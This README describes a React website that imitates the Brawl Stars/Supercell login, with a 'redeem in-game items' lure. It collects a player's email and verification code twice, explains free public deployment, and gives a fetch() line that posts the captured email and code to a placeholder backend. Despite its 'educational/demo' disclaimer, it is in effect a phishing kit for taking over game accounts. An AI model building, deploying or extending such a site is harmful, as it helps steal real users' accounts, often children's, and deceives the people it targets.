# Brawl Stars Login Redeem Website

This is a React-based website for logging in and redeeming in-game items, inspired by the Brawl Stars/ Supercell login flow.

## Features
- Multi-step login: email, verification code (twice), and congratulations page
- Modern, game-inspired UI
- Placeholder for character image
- Progress bar for steps

## Getting Started

### 1. Install dependencies
```bash
npm install
```

### 2. Start the development server
```bash
npm start
```

The app will be available at [http://localhost:3000](http://localhost:3000).

### 3. Build for production
```bash
npm run build
```

## Deploying Online
You can deploy this app for free using:
- [Vercel](https://vercel.com/)
- [Netlify](https://netlify.com/)
- [GitHub Pages](https://pages.github.com/)

Just connect your repository and follow their instructions for React apps.

## Fetching User Data
The app collects email and verification codes. To send this data to your backend:
- Edit the `handleSubmit` functions in `Login.js` and `VerifyCode.js`.
- Use `fetch('https://your-backend-endpoint', { method: 'POST', body: JSON.stringify({ email, code }) })` to send data.

You can connect to any backend (Node.js, Firebase, Google Sheets, etc.).

---
**This project is for educational/demo purposes only.** 